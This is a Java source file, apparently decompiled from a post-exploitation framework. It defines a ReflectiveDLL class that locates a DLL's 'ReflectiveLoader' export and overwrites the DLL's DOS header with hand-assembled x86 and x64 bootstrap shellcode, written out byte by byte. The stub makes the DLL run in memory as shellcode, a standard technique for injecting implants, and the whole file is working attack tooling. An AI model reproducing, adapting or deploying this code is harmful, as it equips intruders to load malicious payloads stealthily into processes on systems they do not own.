package common;

import java.util.Iterator;
import java.util.List;
import pe.PEParser;

public class ReflectiveDLL {
   public static final int EXIT_FUNK_PROCESS = 1453503984;
   public static final int EXIT_FUNK_THREAD = 170532320;

   public static int findReflectiveLoader(byte[] var0) {
      try {
         PEParser var1 = PEParser.load(var0);
         List var2 = var1.getExportedFunctions();
         Iterator var3 = var2.iterator();

         while(var3.hasNext()) {
            String var4 = (String)var3.next();
            if (var4.indexOf("ReflectiveLoader") >= 0) {
               return var1.getFunctionOffset(var4);
            }
         }
      } catch (Exception var5) {
         MudgeSanity.logException("Could not find Reflective Loader", var5, false);
      }

      return -1;
   }

   public static boolean is64(byte[] var0) {
      try {
         PEParser var1 = PEParser.load(var0);
         return var1.is64();
      } catch (Exception var2) {
         MudgeSanity.logException("Could not find parse PE header in binary blob", var2, false);
         return false;
      }
   }

   public static byte[] patchDOSHeader(byte[] var0) {
      return patchDOSHeader(var0, 1453503984);
   }

   public static byte[] patchDOSHeader(byte[] var0, int var1) {
      int var2 = findReflectiveLoader(var0);
      if (is64(var0)) {
         throw new RuntimeException("x64 DLL passed to x86 patch function");
      } else if (var2 < 0) {
         return new byte[0];
      } else {
         Packer var3 = new Packer();
         var3.little();
         var3.addByte(77);
         var3.addByte(90);
         var3.addByte(232);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(91);
         var3.addByte(82);
         var3.addByte(69);
         var3.addByte(85);
         var3.addByte(137);
         var3.addByte(229);
         var3.addByte(129);
         var3.addByte(195);
         var3.addInt(var2 - 7);
         var3.addByte(255);
         var3.addByte(211);
         var3.addByte(137);
         var3.addByte(195);
         var3.addByte(87);
         var3.addByte(104);
         var3.addByte(4);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(80);
         var3.addByte(255);
         var3.addByte(208);
         var3.addByte(104);
         var3.addInt(var1);
         var3.addByte(104);
         var3.addByte(5);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(80);
         var3.addByte(255);
         var3.addByte(211);
         byte[] var4 = var3.getBytes();
         if (var4.length > 60) {
            CommonUtils.print_error("bootstrap length is: " + var4.length + " (it's too big!)");
            return new byte[0];
         } else {
            for(int var5 = 0; var5 < var4.length; ++var5) {
               var0[var5] = var4[var5];
            }

            return var0;
         }
      }
   }

   public static byte[] patchDOSHeaderX64(byte[] var0) {
      return patchDOSHeaderX64(var0, 1453503984);
   }

   public static byte[] patchDOSHeaderX64(byte[] var0, int var1) {
      int var2 = findReflectiveLoader(var0);
      if (!is64(var0)) {
         throw new RuntimeException("x86 DLL passed to x64 patch function");
      } else if (var2 < 0) {
         return new byte[0];
      } else {
         Packer var3 = new Packer();
         var3.little();
         var3.addByte(77);
         var3.addByte(90);
         var3.addByte(65);
         var3.addByte(82);
         var3.addByte(85);
         var3.addByte(72);
         var3.addByte(137);
         var3.addByte(229);
         var3.addByte(72);
         var3.addByte(129);
         var3.addByte(236);
         var3.addByte(32);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(72);
         var3.addByte(141);
         var3.addByte(29);
         var3.addByte(234);
         var3.addByte(255);
         var3.addByte(255);
         var3.addByte(255);
         var3.addByte(72);
         var3.addByte(129);
         var3.addByte(195);
         var3.addInt(var2);
         var3.addByte(255);
         var3.addByte(211);
         var3.addByte(72);
         var3.addByte(137);
         var3.addByte(195);
         var3.addByte(73);
         var3.addByte(137);
         var3.addByte(248);
         var3.addByte(104);
         var3.addByte(4);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(90);
         var3.addByte(255);
         var3.addByte(208);
         var3.addByte(65);
         var3.addByte(184);
         var3.addInt(var1);
         var3.addByte(104);
         var3.addByte(5);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(90);
         var3.addByte(255);
         var3.addByte(211);
         byte[] var4 = var3.getBytes();
         if (var4.length > 60) {
            CommonUtils.print_error("bootstrap length is: " + var4.length + " (it's too big!)");
            return new byte[0];
         } else {
            for(int var5 = 0; var5 < var4.length; ++var5) {
               var0[var5] = var4[var5];
            }

            return var0;
         }
      }
   }
}
